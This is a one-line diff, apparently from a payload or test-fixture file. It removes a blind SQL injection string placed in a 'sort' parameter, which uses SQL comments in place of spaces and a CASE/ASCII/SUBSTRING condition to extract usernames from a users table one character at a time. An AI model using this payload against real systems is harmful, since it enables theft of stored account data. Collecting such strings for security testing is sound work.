@@ -1,1 +1,0 @@
-sort=(CASE/**/WHEN/**/(SELECT/**/ASCII(SUBSTRING(username,%201,1))/**/FROM/**/users/**/where/**/id/**/=/**/$$1$$)=97/**/THEN/**/username/**/END)
